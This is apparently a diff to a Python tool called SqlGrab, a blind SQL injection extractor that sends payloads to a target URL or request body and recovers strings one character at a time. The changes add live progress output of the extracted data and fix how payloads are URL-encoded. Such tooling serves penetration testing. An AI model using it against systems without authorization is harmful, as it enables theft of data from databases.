@@ -113,6 +113,11 @@ class SqlGrab:
 
             time.sleep(self.delay)
 
+        if status:
+            if context:
+                context['result'] += chr(args['value'])
+            print(status.format(context=context, min=min, max=max), end='\r')
+
         # sanity check
         if not self.getMatch(payload, dict(**args, operator='=')):
             raise RuntimeError(
@@ -141,7 +146,7 @@ class SqlGrab:
                 status="[*] [\x1b[90m{context[i]}/{context[length]}: Between '{min:c}' and '{max:c}'\x1b[0m] \x1b[32m{context[result]}\x1b[0m",
                 args=dict(**args, index=i, value=self.initialCharacter)
             ))
-
+        
         # sanity check
         if not self.getMatch(self.payloads['string'], args=dict(**args, value=result, operator='=')):
             raise RuntimeError(
@@ -162,14 +167,16 @@ class SqlGrab:
         prepared.headers['Connection'] = 'keep-alive'
 
         payload = payload.format(**args)
-        if self.urlencode:
-            urllib.parse.quote_plus(payload)
 
         # perform {payload} tag subsitution
-        prepared.url = prepared.url.replace('%7Bpayload%7D', urllib.parse.quote_plus(
-            payload))  # URL payload will always be urlencoded
+        prepared.url = prepared.url.replace(
+            '%7Bpayload%7D',
+            urllib.parse.quote_plus(payload))  # URL payload will always be urlencoded
+
 
         if prepared.body:
+            if self.urlencode:
+                payload = urllib.parse.quote_plus(payload)
             body = prepared.body.decode('utf-8')
             body = body.replace("{payload}", payload)
             prepared.body = body.encode('utf-8')
@@ -244,8 +251,8 @@ if __name__ == "__main__":
                         help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\'')
     parser.add_argument('--delay', required=False, default=0, type=float,
                         help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
-    parser.add_argument('--urlencode', required=False, action='store_false',
-                        help='Perform URL-encoding on the payloads. Optional. E.g. True, False')
+    parser.add_argument('--urlencode', required=False, action='store_true',
+                        help='Perform URL-encoding on the payloads.')
     parser.add_argument('--proxy', required=False,
                         help='Proxy to use, e.g. http://127.0.0.1:8080')
 
